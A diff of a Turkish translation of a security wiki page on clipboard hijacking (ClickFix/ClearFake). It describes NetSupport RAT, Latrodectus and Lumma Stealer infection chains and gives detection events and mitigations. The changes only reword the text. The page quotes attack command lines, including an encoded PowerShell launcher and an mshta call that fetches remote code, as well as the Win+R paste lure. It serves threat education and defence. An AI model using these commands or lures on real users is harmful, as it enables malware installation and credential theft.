@@ -6,7 +6,7 @@
 
 ## Overview
 
-Clipboard hijacking – ayrıca *pastejacking* olarak da bilinir – kullanıcıların komutları incelemeden kopyalayıp yapıştırma alışkanlığından faydalanır. Kötü niyetli bir web sayfası (veya Electron veya masaüstü uygulaması gibi herhangi bir JavaScript uyumlu bağlam) programatik olarak saldırgan kontrolündeki metni sistem panosuna yerleştirir. Kurbanlar, genellikle dikkatlice hazırlanmış sosyal mühendislik talimatlarıyla, **Win + R** (Çalıştır penceresi), **Win + X** (Hızlı Erişim / PowerShell) tuşlarına basmaları veya bir terminal açıp *panodaki* içeriği yapıştırmaları için teşvik edilir, bu da hemen rastgele komutların yürütülmesini sağlar.
+Clipboard hijacking – ayrıca *pastejacking* olarak da bilinir – kullanıcıların komutları incelemeden kopyalayıp yapıştırma alışkanlıklarından faydalanır. Kötü niyetli bir web sayfası (veya Electron veya masaüstü uygulaması gibi herhangi bir JavaScript uyumlu bağlam) programatik olarak saldırgan kontrolündeki metni sistem panosuna yerleştirir. Kurbanlar, genellikle dikkatlice hazırlanmış sosyal mühendislik talimatlarıyla, **Win + R** (Çalıştır penceresi), **Win + X** (Hızlı Erişim / PowerShell) tuşlarına basmaları veya bir terminal açıp *panodaki* içeriği yapıştırmaları için teşvik edilir, bu da hemen rastgele komutların yürütülmesini sağlar.
 
 **Hiçbir dosya indirilmediği ve hiçbir ek açılmadığı için**, bu teknik, ekleri, makroları veya doğrudan komut yürütmeyi izleyen çoğu e-posta ve web içerik güvenlik kontrolünü atlar. Bu nedenle, saldırı, NetSupport RAT, Latrodectus yükleyici veya Lumma Stealer gibi ticari kötü amaçlı yazılım ailelerini dağıtan phishing kampanyalarında popülerdir.
 
@@ -27,9 +27,9 @@ Eski kampanyalar `document.execCommand('copy')` kullanıyordu, yenileri ise asen
 ## ClickFix / ClearFake Akışı
 
 1. Kullanıcı bir yazım hatası yapılmış veya ele geçirilmiş bir siteyi ziyaret eder (örneğin `docusign.sa[.]com`)
-2. Enjekte edilmiş **ClearFake** JavaScript, sessizce bir Base64 kodlu PowerShell tek satırını panoya kaydeden `unsecuredCopyToClipboard()` yardımcı fonksiyonunu çağırır.
+2. Enjekte edilmiş **ClearFake** JavaScript, sessizce Base64 kodlu bir PowerShell tek satırlık komutunu panoya kaydeden `unsecuredCopyToClipboard()` yardımcı fonksiyonunu çağırır.
 3. HTML talimatları kurbanı şunları yapmaya yönlendirir: *“**Win + R** tuşlarına basın, komutu yapıştırın ve sorunu çözmek için Enter'a basın.”*
-4. `powershell.exe` çalıştırılır, meşru bir yürütülebilir dosya ile birlikte kötü niyetli bir DLL içeren bir arşiv indirir (klasik DLL yan yükleme).
+4. `powershell.exe` çalıştırılır, meşru bir yürütülebilir dosya ile kötü niyetli bir DLL içeren bir arşiv indirir (klasik DLL yan yükleme).
 5. Yükleyici ek aşamaları şifre çözer, shellcode enjekte eder ve kalıcılığı kurar (örneğin, planlanmış görev) – nihayetinde NetSupport RAT / Latrodectus / Lumma Stealer'ı çalıştırır.
 
 ### Örnek NetSupport RAT Zinciri
@@ -41,7 +41,7 @@ Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
 %TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
 ```
 * `jp2launcher.exe` (meşru Java WebStart) dizininde `msvcp140.dll` arar.
-* Kötü niyetli DLL, API'leri dinamik olarak **GetProcAddress** ile çözer, iki ikili dosyayı (**data_3.bin**, **data_4.bin**) **curl.exe** aracılığıyla indirir, bunları bir döngüsel XOR anahtarı `"https://google.com/"` kullanarak şifrelerini çözer, son shellcode'u enjekte eder ve **client32.exe** (NetSupport RAT) dosyasını `C:\ProgramData\SecurityCheck_v1\` dizinine çıkarır.
+* Kötü niyetli DLL, **GetProcAddress** ile API'leri dinamik olarak çözer, **curl.exe** aracılığıyla iki ikili dosya (`data_3.bin`, `data_4.bin`) indirir, bunları bir döngü XOR anahtarı `"https://google.com/"` kullanarak şifrelerini çözer, son shellcode'u enjekte eder ve **client32.exe** (NetSupport RAT) dosyasını `C:\ProgramData\SecurityCheck_v1\` dizinine çıkarır.
 
 ### Latrodectus Loader
 ```
@@ -49,13 +49,13 @@ powershell -nop -enc <Base64>  # Cloud Identificator: 2031
 ```
 1. **curl.exe** ile `la.txt` indirir
 2. **cscript.exe** içinde JScript indiricisini çalıştırır
-3. MSI yüklemesini alır → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL yan yükleme → shellcode → Latrodectus.
+3. MSI yükleyicisini alır → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL yan yükleme → shellcode → Latrodectus.
 
-### MSHTA ile Lumma Stealer
+### Lumma Stealer MSHTA aracılığıyla
 ```
 mshta https://iplogger.co/xxxx =+\\xxx
 ```
-**mshta** çağrısı, `PartyContinued.exe`'yi alıp, `Boat.pst`'yi (CAB) çıkartarak, `AutoIt3.exe`'yi `extrac32` ve dosya birleştirme ile yeniden inşa eden ve sonunda tarayıcı kimlik bilgilerini `sumeriavgv.digital`'a dışarı aktaran bir `.a3x` scripti çalıştıran gizli bir PowerShell scriptini başlatır.
+**mshta** çağrısı, `PartyContinued.exe`'yi alıp, `Boat.pst`'yi (CAB) çıkartarak, `AutoIt3.exe`'yi `extrac32` ve dosya birleştirmesi ile yeniden yapılandıran ve nihayetinde tarayıcı kimlik bilgilerini `sumeriavgv.digital`'a dışarı aktaran bir `.a3x` scripti çalıştıran gizli bir PowerShell scriptini başlatır.
 
 ## Tespit ve Avlanma
 
@@ -66,16 +66,17 @@ Mavi takımlar, yapıştırma istismarı tespit etmek için panoya, işlem oluş
 * Olay ID **4663**, şüpheli 4688 olayından hemen önce `%LocalAppData%\Microsoft\Windows\WinX\` veya geçici klasörler altında dosya oluşturma için.
 * EDR pano sensörleri (varsa) – `Clipboard Write` ile hemen ardından yeni bir PowerShell işlemi arasında ilişki kurun.
 
-## Hafifletmeler
+## Azaltmalar
 
 1. Tarayıcı güçlendirme – pano yazma erişimini devre dışı bırakın (`dom.events.asyncClipboard.clipboardItem` vb.) veya kullanıcı jesti gerektirin.
 2. Güvenlik farkındalığı – kullanıcılara hassas komutları *yazmayı* veya önce bir metin editörüne yapıştırmayı öğretin.
-3. PowerShell Kısıtlı Dil Modu / Çalıştırma Politikası + Uygulama Kontrolü, keyfi tek satırlık komutları engellemek için.
+3. PowerShell Kısıtlı Dil Modu / İcra Politikası + Uygulama Kontrolü, keyfi tek satırlık komutları engellemek için.
 4. Ağ kontrolleri – bilinen yapıştırma istismarı ve kötü amaçlı yazılım C2 alanlarına giden istekleri engelleyin.
 
 ## İlgili Hileler
 
-* **Discord Davet İstismarı**, kullanıcıları kötü niyetli bir sunucuya çekmenin ardından aynı ClickFix yaklaşımını sıkça istismar eder:
+* **Discord Davet Hijacking**, kullanıcıları kötü niyetli bir sunucuya çekmenin ardından aynı ClickFix yaklaşımını sıklıkla istismar eder:
+
 {{#ref}}
 discord-invite-hijacking.md
 {{#endref}}
